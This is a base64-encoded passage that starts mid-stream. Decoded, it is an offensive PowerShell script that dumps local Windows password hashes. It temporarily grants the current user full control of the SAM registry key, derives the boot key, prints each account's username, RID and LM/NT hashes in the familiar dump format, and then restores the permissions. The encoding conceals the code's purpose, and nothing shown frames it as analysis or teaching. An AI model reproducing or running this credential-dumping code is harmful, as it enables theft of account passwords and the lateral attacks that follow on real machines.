gICBBZGQtTWVtYmVyIEFsaWFzUHJvcGVydHkgS2V5TmFtZSBQU0NoaWxkTmFtZSAtUGFzc1RocnUgfAogICAgICAgICAgICBBZGQtTWVtYmVyIFNjcmlwdFByb3BlcnR5IFJpZCB7W0NvbnZlcnRdOjpUb0ludDMyKCR0aGlzLlBTQ2hpbGROYW1lLCAxNil9IC1QYXNzVGhydSB8CiAgICAgICAgICAgIEFkZC1NZW1iZXIgU2NyaXB0UHJvcGVydHkgViB7W2J5dGVbXV0oJHRoaXMuR2V0VmFsdWUoIlYiKSl9IC1QYXNzVGhydSB8CiAgICAgICAgICAgIEFkZC1NZW1iZXIgU2NyaXB0UHJvcGVydHkgVXNlck5hbWUge0dldC1Vc2VyTmFtZSgkdGhpcy5HZXRWYWx1ZSgiViIpKX0gLVBhc3NUaHJ1IHwKICAgICAgICAgICAgQWRkLU1lbWJlciBTY3JpcHRQcm9wZXJ0eSBIYXNoT2Zmc2V0IHtbQml0Q29udmVydGVyXTo6VG9VSW50MzIoJHRoaXMuR2V0VmFsdWUoIlYiKVsweDljLi4weDlmXSwwKSArIDB4Q0N9IC1QYXNzVGhydQp9CgpmdW5jdGlvbiBEdW1wSGFzaGVzCnsKICAgIExvYWRBcGkKICAgICRib290a2V5ID0gR2V0LUJvb3RLZXk7CiAgICAkaGJvb3RLZXkgPSBHZXQtSEJvb3RLZXkgJGJvb3RrZXk7CiAgICBHZXQtVXNlcktleXMgfCAlewogICAgICAgICRoYXNoZXMgPSBHZXQtVXNlckhhc2hlcyAkXyAkaEJvb3RLZXk7CiAgICAgICAgInswfTp7MX06ezJ9OnszfTo6OiIgLWYgKCRfLlVzZXJOYW1lLCRfLlJpZCwKICAgICAgICAgICAgW0JpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRoYXNoZXNbMF0pLlJlcGxhY2UoIi0iLCIiKS5Ub0xvd2VyKCksCiAgICAgICAgICAgIFtCaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkaGFzaGVzWzFdKS5SZXBsYWNlKCItIiwiIikuVG9Mb3dlcigpKTsKICAgIH0KfQoKICAgICNodHRwOi8vd3d3LmxhYm9mYXBlbmV0cmF0aW9udGVzdGVyLmNvbS8yMDEzLzA1L3Bvc2hpbmctaGFzaGVzLXBhcnQtMi5odG1sP3Nob3dDb21tZW50PTEzODY3MjU4NzQxNjcjYzg1MTM5ODA3MjU4MjM3NjQwNjAKICAgIGlmICgtTk9UIChbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NQcmluY2lwYWxdW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHldOjpHZXRDdXJyZW50KCkpLklzSW5Sb2xlKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0J1aWx0SW5Sb2xlXSAiQWRtaW5pc3RyYXRvciIpKQogICAgewogICAgICAgIFdyaXRlLVdhcm5pbmcgIlNjcmlwdCByZXF1aXJlcyBlbGV2YXRlZCBvciBhZG1pbmlzdHJhdGl2ZSBwcml2aWxlZ2VzLiIKICAgICAgICBSZXR1cm4KICAgIH0gCiAgICBlbHNlCiAgICB7CiAgICAgICAgI1NldCBwZXJtaXNzaW9ucyBmb3IgdGhlIGN1cnJlbnQgdXNlci4KICAgICAgICAkcnVsZSA9IE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LkFjY2Vzc0NvbnRyb2wuUmVnaXN0cnlBY2Nlc3NSdWxlICgKICAgICAgICBbU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHldOjpHZXRDdXJyZW50KCkuTmFtZSwKICAgICAgICAiRnVsbENvbnRyb2wiLAogICAgICAgIFtTeXN0ZW0uU2VjdXJpdHkuQWNjZXNzQ29udHJvbC5Jbmhlcml0YW5jZUZsYWdzXSJPYmplY3RJbmhlcml0LENvbnRhaW5lckluaGVyaXQiLAogICAgICAgIFtTeXN0ZW0uU2VjdXJpdHkuQWNjZXNzQ29udHJvbC5Qcm9wYWdhdGlvbkZsYWdzXSJOb25lIiwKICAgICAgICBbU3lzdGVtLlNlY3VyaXR5LkFjY2Vzc0NvbnRyb2wuQWNjZXNzQ29udHJvbFR5cGVdIkFsbG93IikKICAgICAgICAka2V5ID0gW01pY3Jvc29mdC5XaW4zMi5SZWdpc3RyeV06OkxvY2FsTWFjaGluZS5PcGVuU3ViS2V5KAogICAgICAgICJTQU1cU0FNXERvbWFpbnMiLAogICAgICAgIFtNaWNyb3NvZnQuV2luMzIuUmVnaXN0cnlLZXlQZXJtaXNzaW9uQ2hlY2tdOjpSZWFkV3JpdGVTdWJUcmVlLAogICAgICAgIFtTeXN0ZW0uU2VjdXJpdHkuQWNjZXNzQ29udHJvbC5SZWdpc3RyeVJpZ2h0c106OkNoYW5nZVBlcm1pc3Npb25zKQogICAgICAgICRhY2wgPSAka2V5LkdldEFjY2Vzc0NvbnRyb2woKQogICAgICAgICRhY2wuU2V0QWNjZXNzUnVsZSgkcnVsZSkKICAgICAgICAka2V5LlNldEFjY2Vzc0NvbnRyb2woJGFjbCkKCiAgICAgICAgRHVtcEhhc2hlcwoKICAgICAgICAjUmVtb3ZlIHRoZSBwZXJtaXNzaW9ucyBhZGRlZCBhYm92ZS4KICAgICAgICAkdXNlciA9IFtTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1cnJlbnQoKS5OYW1lCiAgICAgICAgJGFjbC5BY2Nlc3MgfCB3aGVyZSB7JF8uSWRlbnRpdHlSZWZlcmVuY2UuVmFsdWUgLWVxICR1c2VyfSB8ICV7JGFjbC5SZW1vdmVBY2Nlc3NSdWxlKCRfKX0gfCBPdXQtTnVsbAogICAgICAgIFNldC1BY2wgSEtMTTpcU0FNXFNBTVxEb21haW5zICRhY2wKCiAgICB9Cn0K
